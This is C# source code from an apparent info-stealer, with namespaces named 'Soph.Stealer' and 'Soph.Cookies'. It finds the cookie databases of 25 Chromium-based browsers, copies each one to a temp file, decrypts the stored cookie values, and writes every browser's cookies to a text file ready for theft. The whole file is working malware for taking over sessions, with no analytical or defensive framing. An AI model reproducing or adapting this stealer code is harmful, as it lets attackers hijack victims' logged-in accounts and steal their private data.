

using Soph.Stealer;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Soph.Cookies
{
  internal static class Chromium
  {
    public static void ChromiumInitialise(string path)
    {
      string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
      string[] strArray = new string[25]
      {
             environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
            environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
            environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
            environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
            environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
            environmentVariable + "\\Torch\\User Data\\Default\\Cookies",
            environmentVariable + "\\CentBrowser\\User Data\\Default\\Сookies",
            environmentVariable + "\\Go!\\User Data\\Default\\Cookies",
            environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Cookies",
            environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Cookies",
            environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
            environmentVariable + "\\BlackHawk\\User Data\\Default\\Cookies",
            environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Cookies",
            environmentVariable + "\\CoolNovo\\User Data\\Default\\Cookies",
            environmentVariable + "\\Epic Browser\\User Data\\Default\\Cookies",
            environmentVariable + "\\Baidu Spark\\User Data\\Default\\Cookies",
            environmentVariable + "\\Rockmelt\\User Data\\Default\\Cookies",
            environmentVariable + "\\Sleipnir\\User Data\\Default\\Cookies",
            environmentVariable + "\\SRWare Iron\\User Data\\Default\\Cookies",
            environmentVariable + "\\Titan Browser\\User Data\\Default\\Cookies",
            environmentVariable + "\\Flock\\User Data\\Default\\Cookies",
            environmentVariable + "\\Vivaldi\\User Data\\Default\\Cookies",
            environmentVariable + "\\Sputnik\\User Data\\Default\\Cookies",
            environmentVariable + "\\Maxthon\\User Data\\Default\\Cookies"
      };
      foreach (string basePath in strArray)
      {
        try
        {
          string str = "";
                    if(basePath.Contains("Chrome"))
          str = "Google";
                    if (basePath.Contains("Yandex"))
                        str = "Yandex";
                    if (basePath.Contains("Orbitum"))
                        str = "Orbitum";
                    if (basePath.Contains("Opera"))
                        str = "Opera";
                    if (basePath.Contains("Amigo"))
                        str = "Amigo";
                    if (basePath.Contains("Torch"))
                        str = "Torch";
                    if (basePath.Contains("Comodo"))
                        str = "Comodo";
                    if (basePath.Contains("CentBrowser"))
                        str = "CentBrowser";
                    if (basePath.Contains("Go!"))
                        str = "Go!";
                    if (basePath.Contains("uCozMedia"))
                        str = "uCozMedia";
                    if (basePath.Contains("MapleStudio"))
                        str = "MapleStudio";
                    if (basePath.Contains("BlackHawk"))
                        str = "BlackHawk";
                    if (basePath.Contains("CoolNovo"))
                        str = "CoolNovo";
                    if (basePath.Contains("Vivaldi"))
                        str = "Vivaldi";
                    if (basePath.Contains("Sputnik"))
                        str = "Sputnik";
                    if (basePath.Contains("Maxthon"))
                        str = "Maxthon";
                    if (basePath.Contains("AcWebBrowser"))
                        str = "AcWebBrowser";
                    if (basePath.Contains("Epic Browser"))
                        str = "Epic Browser";
                    if (basePath.Contains("Baidu Spark"))
                        str = "Baidu Spark";
                    if (basePath.Contains("Rockmelt"))
                        str = "Rockmelt";
                    if (basePath.Contains("Sleipnir"))
                        str = "Sleipnir";
                    if (basePath.Contains("SRWare Iron"))
                        str = "SRWare Iron";
                    if (basePath.Contains("Titan Browser"))
                        str = "Titan Browser";
                    if (basePath.Contains("Flock"))
                        str = "Flock";
                    try
          {
            List<Cookie> cookies = Chromium.GetCookies(basePath);
            if (cookies != null)
            {
              Directory.CreateDirectory(path + "\\Cookies\\");
              using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
              {
                
                foreach (Cookie cookie in cookies)
                {
                  if (cookie.expirationDate == "9223372036854775807")
                    cookie.expirationDate = "0";
                  if ((int) cookie.domain[0] != 46)
                    cookie.hostOnly = "FALSE";
                  streamWriter.Write(cookie.domain + "\t" + cookie.hostOnly + "\t" + cookie.path + "\t" + cookie.secure + "\t" + cookie.expirationDate + "\t" + cookie.name + "\t" + cookie.value + "\r\n");
                }
              }
            }
          }
          catch
          {
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }

    private static List<Cookie> GetCookies(string basePath)
    {
      if (!File.Exists(basePath))
        return (List<Cookie>) null;
      try
      {
        string str = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
        if (File.Exists(str))
          File.Delete(str);
        File.Copy(basePath, str, true);
        Sqlite sqlite = new Sqlite(str);
        sqlite.ReadTable("cookies");
        List<Cookie> cookieList = new List<Cookie>();
        for (int rowNum = 0; rowNum < sqlite.GetRowCount(); ++rowNum)
        {
          try
          {
            string empty = string.Empty;
            try
            {
              empty = Encoding.UTF8.GetString(Soph.Stealer.Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(rowNum, 12)), (byte[]) null));
            }
#pragma warning disable CS0168 // Переменная объявлена, но не используется
                        catch (Exception ex)
#pragma warning restore CS0168 // Переменная объявлена, но не используется
                        {
            }
            bool result;
            bool.TryParse(sqlite.GetValue(rowNum, 6), out result);
            cookieList.Add(new Cookie()
            {
              domain = sqlite.GetValue(rowNum, 1),
              name = sqlite.GetValue(rowNum, 2),
              path = sqlite.GetValue(rowNum, 4),
              expirationDate = sqlite.GetValue(rowNum, 5),
              secure = result.ToString().ToUpper(),
              value = empty,
              hostOnly = "TRUE"
            });
          }
          catch (Exception ex)
          {
            Console.WriteLine(ex.ToString());
          }
        }
        return cookieList;
      }
      catch
      {
        return new List<Cookie>();
      }
    }
  }
}
